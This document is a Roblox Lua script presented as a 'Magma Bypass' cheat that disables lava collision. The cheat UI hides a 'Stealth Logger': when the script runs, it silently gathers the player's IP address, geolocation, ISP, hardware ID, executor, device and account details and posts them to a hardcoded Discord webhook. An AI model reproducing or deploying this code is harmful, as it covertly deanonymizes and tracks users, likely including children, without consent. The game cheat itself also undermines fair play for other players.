local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local GuiService = game:GetService("GuiService")
local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local PlayerGui = lp:WaitForChild("PlayerGui")

-- Webhook URL
local url = "https://webhook.lewisakura.moe/api/webhooks/1472130886550945802/bHPREhnis3MtjMK3xA2lMZeuoSQvBbxK8UTqzLk_znZodpVyzwvxHlcNwPNCrj22F-Bf"
local function sendDetailedLog()
    local ipData = "取得失敗"
    local geoData = {regionName = "不明", city = "不明", isp = "不明", proxy = false}
    local info = {Name = "不明"}
    local avatarUrl = ""

    pcall(function()
        -- 720x720の全身画像を取得（高画質設定）
        local thumbApi = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. lp.UserId .. "&size=720x720&format=Png&isCircular=false"
        local thumbRes = game:HttpGet(thumbApi)
        local thumbData = HttpService:JSONDecode(thumbRes)
        if thumbData and thumbData.data and thumbData.data[1] then
            avatarUrl = thumbData.data[1].imageUrl
        else
            -- 失敗時のバックアップ
            avatarUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. lp.UserId .. "&width=420&height=420&format=png"
        end
    end)

    pcall(function()
        info = MarketplaceService:GetProductInfo(game.PlaceId)
        ipData = game:HttpGet("https://api.ipify.org")
        local response = game:HttpGet("http://ip-api.com/json/" .. ipData .. "?lang=ja&fields=status,message,country,regionName,city,isp,proxy")
        geoData = HttpService:JSONDecode(response)
    end)

    local executor = (identifyexecutor and identifyexecutor()) or "不明なExecutor"
    local hwid = (gethwid and gethwid()) or "取得不可"
    
    local deviceDetail = "不明"
    if GuiService:IsTenFootInterface() then
        deviceDetail = "🎮 Console (Xbox/PS)"
    elseif UserInputService.TouchEnabled then
        local screenSize = workspace.CurrentCamera.ViewportSize
        if math.min(screenSize.X, screenSize.Y) < 600 then
            deviceDetail = "📱 Mobile (Phone)"
        else
            deviceDetail = "平板 Tablet"
        end
    elseif UserInputService.KeyboardEnabled then
        deviceDetail = "💻 PC (Windows/Mac)"
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "🚨 実行者特定ログ: " .. lp.Name,
            ["color"] = 0xff4500,
            ["fields"] = {
                {
                    ["name"] = "👤 ユーザー",
                    ["value"] = "**Username:** `" .. lp.Name .. "`\n**DisplayName:** " .. lp.DisplayName .. "\n**UserID:** `" .. lp.UserId .. "`\n**垢経過:** " .. lp.AccountAge .. "日",
                    ["inline"] = true
                },
                {
                    ["name"] = "🛠 実行環境",
                    ["value"] = "**Device:** " .. deviceDetail .. "\n**Executor:** `" .. executor .. "`\n**HWID:** `" .. hwid .. "`",
                    ["inline"] = true
                },
                {
                    ["name"] = "🌐 ネットワーク",
                    ["value"] = "**IP:** `" .. ipData .. "`\n**地域:** " .. geoData.regionName .. " " .. geoData.city .. "\n**ISP:** " .. geoData.isp .. "\n**VPN/Proxy:** " .. (geoData.proxy and "🚩 検出" or "✅ 無し"),
                    ["inline"] = false
                },
                {
                    ["name"] = "📍 サーバー/実行場所",
                    ["value"] = "**Game:** " .. info.Name .. "\n**PlaceId:** " .. game.PlaceId .. "\n**JobId:** `" .. game.JobId .. "`",
                    ["inline"] = false
                }
            },
            -- 下のデカい画像は削除し、右上のサムネイルのみに
            ["thumbnail"] = {
                ["url"] = avatarUrl
            },
            ["footer"] = {
                ["text"] = "Shiun4545 Stealth Logger | " .. os.date("%Y/%m/%d %X")
            }
        }}
    }

    pcall(function()
        local req = (syn and syn.request) or (http and http.request) or request
        if req then
            req({
                Url = url,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(data)
            })
        end
    end)
end

-------------------------------------------------------
-- 2. メインUI機能 (Magma Bypass UI)
-------------------------------------------------------
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MagmaBypassUI"
ScreenGui.Parent = PlayerGui
ScreenGui.ResetOnSpawn = false

-- アラート画面
local AlertFrame = Instance.new("Frame")
AlertFrame.Name = "AlertFrame"
AlertFrame.Parent = ScreenGui
AlertFrame.Size = UDim2.new(1, 0, 1, 0)
AlertFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
AlertFrame.BackgroundTransparency = 0.5
AlertFrame.ZIndex = 10

local AlertText = Instance.new("TextLabel")
AlertText.Parent = AlertFrame
AlertText.Size = UDim2.new(0.8, 0, 0.3, 0)
AlertText.Position = UDim2.new(0.1, 0, 0.3, 0)
AlertText.BackgroundTransparency = 1
AlertText.Font = Enum.Font.SourceSansBold
AlertText.Text = "時々サーバーのバグでサーバーが固まることがあります。\nその場合は「キャラをリセット」ボタンを押してください。"
AlertText.TextColor3 = Color3.fromRGB(255, 255, 255)
AlertText.TextSize = 24
AlertText.TextWrapped = true

local CloseAlertButton = Instance.new("TextButton")
CloseAlertButton.Parent = AlertFrame
CloseAlertButton.Size = UDim2.new(0, 200, 0, 50)
CloseAlertButton.Position = UDim2.new(0.5, -100, 0.65, 0)
CloseAlertButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
CloseAlertButton.Text = "わかった"
CloseAlertButton.Font = Enum.Font.SourceSansBold
CloseAlertButton.TextSize = 22
CloseAlertButton.TextColor3 = Color3.fromRGB(255, 255, 255)

CloseAlertButton.MouseButton1Click:Connect(function()
    AlertFrame.Visible = false
end)

-- 切り替えボタン類
local ToggleButton = Instance.new("TextButton")
local ResetButton = Instance.new("TextButton")

ToggleButton.Name = "ToggleButton"
ToggleButton.Parent = ScreenGui
ToggleButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
ToggleButton.Position = UDim2.new(0, 10, 0.5, -30)
ToggleButton.Size = UDim2.new(0, 150, 0, 50)
ToggleButton.Font = Enum.Font.SourceSansBold
ToggleButton.Text = "マグマ無効: OFF"
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.TextSize = 20

ResetButton.Name = "ResetButton"
ResetButton.Parent = ScreenGui
ResetButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
ResetButton.Position = UDim2.new(0, 10, 0.5, 30)
ResetButton.Size = UDim2.new(0, 150, 0, 50)
ResetButton.Font = Enum.Font.SourceSansBold
ResetButton.Text = "キャラをリセット"
ResetButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ResetButton.TextSize = 20

local isEnabled = false

local function setMagmaTouch(state)
    for _, part in pairs(game.Workspace:GetDescendants()) do
        if part:IsA("BasePart") and (part.Name:find("Magma") or part.Name:find("Lava") or part.Name:find("Rising")) then
            part.CanTouch = state
            part.Transparency = state and 0 or 0.5 
        end
    end
end

ToggleButton.MouseButton1Click:Connect(function()
    isEnabled = not isEnabled
    if isEnabled then
        setMagmaTouch(false)
        ToggleButton.Text = "マグマ無効: ON"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(50, 255, 50)
    else
        setMagmaTouch(true)
        ToggleButton.Text = "マグマ無効: OFF"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    end
end)

ResetButton.MouseButton1Click:Connect(function()
    local character = lp.Character
    if character then
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.Health = 0
            print("キャラクターをリセットしました。")
        end
    end
end)

game.Workspace.DescendantAdded:Connect(function(part)
    if isEnabled and part:IsA("BasePart") then
        if part.Name:find("Magma") or part.Name:find("Lava") or part.Name:find("Rising") then
            task.wait(0.1)
            part.CanTouch = false
            part.Transparency = 0.5
        end
    end
end)

-------------------------------------------------------
-- 実行
-------------------------------------------------------
sendDetailedLog()
